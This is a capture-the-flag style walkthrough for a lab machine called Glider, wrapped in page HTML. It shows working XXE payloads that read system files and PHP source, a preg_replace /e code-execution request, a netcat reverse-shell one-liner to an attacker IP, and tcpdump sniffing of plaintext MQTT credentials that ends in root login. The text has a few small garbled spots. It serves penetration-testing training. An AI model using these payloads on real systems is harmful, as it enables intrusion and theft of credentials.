@@ -1,0 +1,419 @@
+<div id="__BVID__12___BV_modal_content_" tabindex="-1" class="modal-content"><header id="__BVID__12___BV_modal_header_" class="modal-header"><h5 id="__BVID__12___BV_modal_title_" class="modal-title">Walkthrough</h5><button type="button" aria-label="Close" class="close">×</button></header><div id="__BVID__12___BV_modal_body_" class="modal-body"><div class="mb-2 flex-grow" on-finish="function() {
+    [native code]
+}"><div class="markdown-container"><div class="markdown-content text-main-color"><!----><div><h1>Exploitation Guide for Glider</h1>
+<h2>Summary</h2>
+<p>In this guide, we will exploit an <code>XML External Entity Attack</code> in a web application and perform source code analysis on a PHP file where we discover command execution in the <code>preg_replace()</code> function. In order to escalate privileges we will perform a Man i Glider
+newn the Middle Attack against a MQTT server to discover credentials that grant us root access.</p>
+<h2>Enumeration</h2>
+<p>We begin the enumeration process with an <code>nmap</code> scan.</p>
+<pre id="fence-code-17" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ nmap -p- -sC -sV -T4 172.16.201.50 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-22 02:30 MST
+Nmap scan report for 172.16.201.50
+Host is up (0.099s latency).
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
+|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Glider Consulting
+1883/tcp open  mqtt
+|_mqtt-subscribe: Connection rejected: Not Authorized
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 260.21 seconds
+</code></pre>
+<p>Navigating to the target IP we see  the home page for <code>​Glider Business Consulting</code>.
+
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_134_image_1_KX9bFJ1Q.png" alt="home">
+<figcaption>home</figcaption>
+</figure>
+<p></p>
+<p>Looking at the site's menu we see a page with the title <code>Request a demo</code>.</p>
+<p>
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Practice_134_image_2_ZlybJA1m.png" alt="demo">
+<figcaption>demo</figcaption>
+</figure>
+<p></p>
+<p>We see a form for requesting a demo with the form fields: <code>Company Name:</code>, <code>Email Address:</code> and <code>Details:</code>.</p>
+<p>We can intercept the request using <code>burp</code> where we see a <code>POST</code> request sent to <code>demo.php</code>.</p>
+<pre id="fence-code-18" class="fence-code"><code>POST /demo.php HTTP/1.1
+Host: 172.16.201.50
+Content-Length: 64
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://172.16.201.50
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://172.16.201.50/demo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+name=test&amp;email=test%40test.com%0D%0A&amp;details=test&amp;submit=Submit
+</code></pre>
+<p>We can forward the request where we see another <code>POST</code> request sent to <code>/record_xml.php</code>.</p>
+<pre id="fence-code-19" class="fence-code"><code>POST /record_xml.php HTTP/1.1
+Host: 172.16.201.50
+Content-Length: 92
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
+Content-type: text/xml; charset=UTF-8
+Accept: */*
+Origin: http://172.16.201.50
+Referer: http://172.16.201.50/demo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+&lt;users&gt;&lt;name&gt;testing&lt;/name&gt;&lt;email&gt;testing@testing.com&lt;/email&gt;&lt;details&gt;test&lt;/details&gt;&lt;/users&gt;
+</code></pre>
+<p>From the output we see an XML request, hinting toward a potential <code>XXE</code>.</p>
+<pre id="fence-code-20" class="fence-code"><code>HTTP/1.1 200 OK
+Date: Tue, 30 Aug 2022 12:02:35 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 190
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+&lt;h3&gt;Request Preview:&lt;/h3&gt;&lt;p&gt;Company Name: testing&lt;/p&gt;&lt;p&gt;Email : testing@testing.com&lt;/p&gt;&lt;p&gt;Details :<span class="warning-item">test&lt;p/&gt;<span class="warning-item">*******************************************************************<span class="warning-item"><span class="warning-item">
+</span></span></span></span></code></pre>
+<p>Now we can modify our request to read the <code>/etc/passwd</code> file.</p>
+<pre id="fence-code-21" class="fence-code"><code>POST /record_xml.php HTTP/1.1
+Host: 172.16.201.50
+Content-Length: 235
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
+Content-type: text/xml; charset=UTF-8
+Accept: */*
+Origin: http://172.16.201.50
+Referer: http://172.16.201.50/demo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE data [
+   &lt;!ELEMENT data ANY &gt;
+  &lt;!ENTITY testing SYSTEM "file:///etc/passwd" &gt;]&gt;&lt;users&gt;&lt;name&gt;&amp;testing;&lt;/name&gt;&lt;email&gt;testing@testing.com&lt;/email&gt;&lt;details&gt;Date 9023900&lt;/details&gt;&lt;/users&gt;
+</code></pre>
+<p>We have revealed the contents of the <code>/etc/passwd</code> file, confirming that the target is vulnerable to XXE.</p>
+<pre id="fence-code-22" class="fence-code"><code>HTTP/1.1 200 OK
+Date: Tue, 30 Aug 2022 10:23:57 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 1997
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+&lt;h3&gt;Request Preview:&lt;/h3&gt;&lt;p&gt;Company Name: root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+syslog:x:107:113::/home/syslog:/usr/sbin/nologin
+uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
+tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
+usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+steven:x:1000:1000::/home/steven:/bin/sh
+mosquitto:x:113:119::/var/lib/mosquitto:/usr/sbin/nologin
+&lt;/p&gt;&lt;p&gt;
+</code></pre>
+<h1>Exploitation</h1>
+<p>We can proceed by reading the source code of <code>record_xml.php</code> which is located at <code>/var/www/html/record_xml.php</code> by default.</p>
+<p>We receive an empty response because we can't read php files using <code>file://</code>, we'll  need to encode it in base64.</p>
+<p>We can use <code>php://filter/read=convert.base64-encode/resource=file://</code> to encode it and then send a request to display the file.</p>
+<p>Sending the following request responds with the source code of <code>record_xml.php</code> base64 encoded.</p>
+<pre id="fence-code-23" class="fence-code"><code>POST /record_xml.php HTTP/1.1
+Host: 172.16.201.50
+Content-Length: 321
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
+Content-type: text/xml; charset=UTF-8
+Accept: */*
+Origin: http://172.16.201.50
+Referer: http://172.16.201.50/demo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE data [
+   &lt;!ELEMENT data ANY &gt;
+  &lt;!ENTITY testing SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/html/record_xml.php" &gt;]&gt;&lt;users&gt;
+&lt;name&gt;
+&amp;testing;
+&lt;/name&gt;
+&lt;email&gt;
+testing@testing.com
+&lt;/email&gt;
+&lt;details&gt;
+Date 9023900
+&lt;/details&gt;
+&lt;/users&gt;
+</code></pre>
+<p>The output reveals the following:</p>
+<pre id="fence-code-24" class="fence-code"><code>HTTP/1.1 200 OK
+Date: Tue, 30 Aug 2022 10:25:35 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 1105
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+&lt;h3&gt;Request Preview:&lt;/h3&gt;&lt;p&gt;Company Name: 
+PD9waHAgCiAgICAkYm9keSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCJwaHA6Ly9pbnB1dCIpOwogICAgaWYoIWVtcHR5KCRib2R5KSl7CiAgICAgICAgaWYgKCFpc3NldCAoJF9QT1NUWyduYW1lJ10pKXsKICAgICAgICAgICAgbGlieG1sX2Rpc2FibGVfZW50aXR5X2xvYWRlciAoZmFsc2UpOyAKICAgICAgICAgICAgJHhtbGZpbGUgPSAkYm9keTsKICAgICAgICAgICAgJGRvbSA9IG5ldyBET01Eb2N1bWVudCgpOwogICAgICAgICAgICAkZG9tLT5sb2FkWE1MKCR4bWxmaWxlLCBMSUJYTUxfTk9FTlQgfCBMSUJYTUxfRFRETE9BRCk7CiAgICAgICAgICAgICR1c2VycyA9IHNpbXBsZXhtbF9pbXBvcnRfZG9tKCRkb20pOwogICAgICAgICAgICAkbmFtZSA9ICR1c2Vycy0+bmFtZTsKICAgICAgICAgICAgJGVtYWlsID0gJHVzZXJzLT5lbWFpbDsKICAgICAgICAgICAgJGRldGFpbHMgPSAkdXNlcnMtPmRldGFpbHM7CiAgICAgICAgICAgIGVjaG8gIjxoMz5SZXF1ZXN0IFByZXZpZXc6PC9oMz48cD5Db21wYW55IE5hbWU6ICRuYW1lPC9wPjxwPkVtYWlsIDogJGVtYWlsPC9wPjxwPkRldGFpbHMgOjxicj4kZGV0YWlsczxwLz48YnI+KioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKjxicj48YnI+IjsgCiAgICAgICAgfQogICAgfQoKPz4=
+&lt;/p&gt;&lt;p&gt;Email : 
+testing@testing.com
+&lt;/p&gt;&lt;p&gt;Details :<span class="warning-item">
+Date 9023900
+&lt;p/&gt;<span class="warning-item">*******************************************************************<span class="warning-item"><span class="warning-item">
+</span></span></span></span></code></pre>
+<p>We can decode the base64 output and pay attention to the following <code>PHP</code> snippet.</p>
+<pre id="fence-code-25" class="fence-code"><code class="language-php">&lt;?php 
+    $body = file_get_contents("php://input");
+    if(!empty($body)){
+        if (!isset ($_POST['name'])){
+            libxml_disable_entity_loader (false); 
+            $xmlfile = $body;
+            $dom = new DOMDocument();
+            $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+            $users = simplexml_import_dom($dom);
+            $name = $users-&gt;name;
+            $email = $users-&gt;email;
+            $details = $users-&gt;details;
+            echo "&lt;h3&gt;Request Preview:&lt;/h3&gt;&lt;p&gt;Company Name: $name&lt;/p&gt;&lt;p&gt;Email : $email&lt;/p&gt;&lt;p&gt;Details :<span class="warning-item">$details&lt;p/&gt;<span class="warning-item">*******************************************************************<span class="warning-item"><span class="warning-item">"; 
+        }
+    }
+
+?&gt;
+</span></span></span></span></code></pre>
+<p>Going to back <code>index.php</code> we notice that the special characters are being replaced, and we craft the following request:</p>
+<pre id="fence-code-26" class="fence-code"><code>POST /record_xml.php HTTP/1.1
+Host: 172.16.201.50
+Content-Length: 316
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
+Content-type: text/xml; charset=UTF-8
+Accept: */*
+Origin: http://172.16.201.50
+Referer: http://172.16.201.50/demo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE data [
+   &lt;!ELEMENT data ANY &gt;
+  &lt;!ENTITY testing SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/html/index.php" &gt;]&gt;&lt;users&gt;
+&lt;name&gt;
+&amp;testing;
+&lt;/name&gt;
+&lt;email&gt;
+testing@testing.com
+&lt;/email&gt;
+&lt;details&gt;
+Date 9023900
+&lt;/details&gt;
+&lt;/users&gt;
+</code></pre>
+<p>Which responds with a large amount of output encoded in base64.</p>
+<pre id="fence-code-27" class="fence-code"><code>HTTP/1.1 200 OK
+Date: Tue, 30 Aug 2022 10:27:10 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 53973
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+&lt;h3&gt;Request Preview:&lt;/h3&gt;&lt;p&gt;Company Name: 
+PCFET0NUWVBFIGh0bWw+CjxodG1sIHN0eWxlPSJmb250LXNpemU6IDE2cHg7Ij48aGVhZD4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wIj4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDxtZXRhIG5hbWU9ImtleXdvcmRzIiBjb250ZW50PSLigItXZSBhZHZpc2UgbGVhZGVycyBvbiBzdHJhdGVneSwgbWFya2V0aW5nLCBvcmdhbml6YXRpb24sIG9wZXJhdGlvbnMsIEFib3V0IENvbnN1bHRpbmcgRmlybSwg4oCLQ29tcGFueSwg4oCLTWlsZXN0b25lcywg4oCLT3VyIGJ1c2luZXNzIGNvbnN1bHRhbnRzIGNhbiBoZWxwIHlvdSBhZGFwdCB0byB0b2RheeKAmXMgbWFya2V0IGR5bmFtaWNzLCDigItXaGF0IGRvIG91ciB1c2VycyBzYXk/LCBBYm91dCBVcyAmYW1wOyBPdXIgV29yayI+PG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9
+...
+</code></pre>
+<p>Base64 decoding the reponse, we'll pay attention to the following <code>PHP</code> snippet, taking note of the <code>preg_replace()</code> function.</p>
+<pre id="fence-code-28" class="fence-code"><code class="language-php">&lt;?php
+
+function ($str){
+    $replacement = '';
+    $bad_char = array('/\$/','/#/','/!/','/@/','/_/','/%/','/\^/','/&amp;/','/\*/','/\(/','/\)/','/-/','/\+/','/=/','/{/','/}/','/|/');
+    if (isset($_GET['replace'])){
+        $bad_chars = ($_GET['replace']);
+        foreach ($bad_chars as $bad_char =&gt; $replacement){
+            $str = preg_replace($bad_char, $replacement, $str);
+        }
+    }
+    else{
+    $str = preg_replace($bad_char, $replacement, $str);
+    }
+
+    return $str;
+}
+
+$name = clean($_GET['name']);
+
+?&gt;
+</code></pre>
+<p>Researching the <code>preg_replace()</code> function online, we see that it returns a string or array of strings where all matches of a pattern or list of patterns found in the input are replaced with substrings.</p>
+<p>Analyzing the source code, we note the following:</p>
+<ul>
+<li>The function <code>clean</code> takes <code>name</code> parameter and removes all the special characters.</li>
+<li>However if <code>$_GET['replace']</code> is set (If there is a replace parameter in the GET request), it takes that as the pattern to search for, instead of the special characters.</li>
+<li>The vulnerability exists when the user can control the pattern to search for the replacement.</li>
+<li>In this case, if we add an extra parameter <code>replace</code> in the <code>GET</code> request, we can control <code>replace</code> to exploit the vulnerability.</li>
+<li>We need to insert the pattern to search for inside 2 <code>/</code> in <code>[]</code> like this <code>replace[/t/]=a</code></li>
+<li>So if we request <code>replace[/t/]=a</code> it replaces all <code>t</code> with <code>a</code>.</li>
+<li>If we insert <code>e</code> after the delimiter (<code>replace[/t/e]=a</code>), it executes what comes in the place of <code>a</code> if <code>t</code> needs to be replaced.</li>
+</ul>
+<p>We can send the following request:</p>
+<pre id="fence-code-29" class="fence-code"><code>POST /index.php?replace[/n/e]=system('id');&amp;name=n%20w&amp;email=test%40test.com&amp;submit=Submit HTTP/1.1
+Host: 172.16.201.50
+Content-Length: 82
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://172.16.201.50
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://172.16.201.50/demo.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+name=testing&amp;email=testing%40testing.com%0D%0A&amp;details=testing&amp;submit=Submit
+</code></pre>
+<p>We receive a response with <code>www-data</code> confirming RCE.</p>
+<pre id="fence-code-30" class="fence-code"><code>....
+uid=33(www-data) gid=33(www-data) groups=33(www-data) w, You have been subscribed to our newsletter
+</code></pre>
+<p>For our reverse shell we need to base64 encode our reverse shell payload.</p>
+<pre id="fence-code-31" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ echo 'rm /tmp/f;mkfifo /tmp/f ;cat /tmp/f|/bin/sh -i 2&gt;&amp;1 |nc 192.168.118.4 8080  &gt;/tmp/f'  |  base64
+cm0gL3RtcC9mO21rZmlmbyAvdG1wL2YgO2NhdCAvdG1wL2Z8L2Jpbi9zaCAtaSAyPiYxIHxuYyAx
+OTIuMTY4LjExOC40IDgwICA+L3RtcC9mCg==
+
+</code></pre>
+<p>Now we start a listener on our attack machine.</p>
+<pre id="fence-code-32" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ sudo nc -lvnp 8080
+listening on [any] 8080 ...
+</code></pre>
+<p>The payload is <code>system('echo -n "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2YgO2NhdCAvdG1wL2Z8L2Jpbi9zaCAtaSAyPiYxIHxuYyAx OTIuMTY4LjExOC40IDgwICA+L3RtcC9mCg="  | base64 -d | bash');</code></p>
+<p>We can either pass it to <code>replace[/n/e]=</code> parameter or visit <code>http://172.16.201.50/index.php?replace%5B/n/e%5D=system(%27echo%20-n%20%22cm0gL3RtcC9mO21rZmlmbyAvdG1wL2YgO2NhdCAvdG1wL2Z8L2Jpbi9zaCAtaSAyPiYxIHxuYyAxOTIuMTY4LjEuOTkgMTIzNCAgPi90bXAvZgo=%22%20%7C%20base64%20-d%20%7C%20bash%27);&amp;name=n%20w&amp;email=test%40test.com&amp;submit=Submit</code> (url encoded) to get a reverse shell.</p>
+<pre id="fence-code-33" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ sudo nc -lvnp 8080
+listening on [any] 8080 ...
+connect to [192.168.118.4] from (UNKNOWN) [172.16.201.50] 52508
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+</code></pre>
+<h2>Privilege Escalation</h2>
+<p>We know an MQTT server is running on the target machine, but don't have any credentials yet.</p>
+<p>If we go through MQTT's documentation, we can see that the password hash is stored in <code>/etc/mosquitto/passwd</code> along with the username.</p>
+<p>Viewing the contents of <code>/etc/mosquitto/passwd</code></p>
+<pre id="fence-code-34" class="fence-code"><code>www-data@glider:/$ cat /etc/mosquitto/passwd
+steven:$7$101$sDReCPo/BHKUG3R7$cITqpJFV19DnWfHrWPl57tya76z3I+WsPwkcrsa7Y068EERlZxi+nxvexFLHjNJvJdga3UWTB2JlxzOvTx+u7Q==
+</code></pre>
+<p>We see the user <code>steven</code>, and are unfortunately unable to crack the associated hash.</p>
+<p>Checking for any available capabilities we can use <code>getcap</code> with the following command:</p>
+<pre id="fence-code-35" class="fence-code"><code>www-data@glider:/$ getcap -r / 2&gt;/dev/null
+
+/snap/core20/1434/usr/bin/ping cap_net_raw=ep
+/snap/core20/1405/usr/bin/ping cap_net_raw=ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
+/usr/bin/tcpdump cap_net_admin,cap_net_raw=eip
+/usr/bin/mtr-packet cap_net_raw=ep
+/usr/bin/ping cap_net_raw=ep
+</code></pre>
+<p>From the output, <code>tcpdump</code> stands out with the privilege to sniff the network without root privileges.</p>
+<p>As <code>MQTT</code> sends a password without encryption, we can sniff on localhost.</p>
+<p>Running <code>ifconfig</code>, we can see the network interfaces of the target machine.</p>
+<pre id="fence-code-36" class="fence-code"><code>www-data@glider:/$ ifconfig
+enp0s3: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 192.168.43.33  netmask 255.255.255.0  broadcast 192.168.43.255
+        ether 08:00:27:5e:49:71  txqueuelen 1000  (Ethernet)
+        RX packets 423791  bytes 53495914 (53.4 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 410618  bytes 28911095 (28.9 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 343  bytes 28052 (28.0 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 343  bytes 28052 (28.0 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</code></pre>
+<p>We see that interface <code>lo</code> is localhost.</p>
+<p>In order to sniff with <code>tcpdump</code> we need to specify the interface with <code>-i</code>.</p>
+<ul>
+<li>To print the packets we need to specify <code>-A</code>.</li>
+</ul>
+<pre id="fence-code-37" class="fence-code"><code>       -A     Print each packet (minus its link level header) in ASCII.  Handy for capturing web pages.
+</code></pre>
+<p>Now we can run the following command to sniff the network.</p>
+<pre id="fence-code-38" class="fence-code"><code>www-data@glider:/$ tcpdump -i lo -A
+
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+</code></pre>
+<p>After waiting for about 10 seconds many packets are printed out.</p>
+<pre id="fence-code-39" class="fence-code"><code>www-data@glider:/var/www/html$ tcpdump -i lo -A
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode                                                                                             listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+13:56:13.228299 IP localhost.35294 &gt; localhost.1883: Flags [S], seq 1035075819, win 65495, options [mss 65495,sackOK,TS val 665785784 ecr 0,nop,wscale 7], length 0   E..&lt;..@.@.;............[=............0.........                                                                                                                       '...........                                                                                                                                                          13:56:13.228361 IP localhost.1883 &gt; localhost.35294: Flags [S.], seq 3535571478, ack 1035075820, win 65483, options [mss 65495,sackOK,TS val 665785784 ecr 665785784,nop,wscale 7], length 0
+E..&lt;..@.@.&lt;..........[......=........0.........                                                                                                                       '...'.......
+13:56:13.228421 IP localhost.35294 &gt; localhost.1883: Flags [.], ack 1, win 512, options [nop,nop,TS val 665785784 ecr 665785784], length 0                            E..4..@.@.;............[=............(.....                                                                                                                           '...'...
+13:56:13.229216 IP localhost.35294 &gt; localhost.1883: Flags [P.], seq 1:43, ack 1, win 512, options [nop,nop,TS val 665785785 ecr 665785784], length 42                E..^..@.@.:............[=............R.....                                                                                                                           '...'....(..MQTT...&lt;....steven..wannabeinacatfight92
+......
+</code></pre>
+<p>Looking through the ouput, we can see the password <code>wannabeinacatfight92</code> for <code>steven</code> .</p>
+<p>The topic seems to be <code>'important'</code> and we can use it with the <code>-t</code> flag.</p>
+<pre id="fence-code-40" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ mosquitto_sub -h  172.16.201.50 -u steven  -P wannabeinacatfight92 -t important
+
+
+MAIL Creds:
+ Username: root@glider.local
+ Password: Imflyingsohigh8937
+
+</code></pre>
+<p>We have the password <code>Imflyingsohigh8937</code> for <code>root@glider.local</code></p>
+<p>We can login as <code>root</code> with the password <code>Imflyingsohigh8937</code>.</p>
+<pre id="fence-code-41" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ ssh root@ 172.16.201.50
+root@ 172.16.201.50's password:
+Welcome to Ubuntu 22.04 LTS (GNU/Linux 5.15.0-30-generic x86_64)
+
+root@glider:~# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+</div><!----></div></div><div class="d-flex flex-row full-width mt-4 mb-1 justify-content-end"><button type="button" class="btn transparent-btn mb-2 pl-0 pr-0 btn-link btn-lg">
+      Close
+    </button><!----></div></div></div><!----></div>
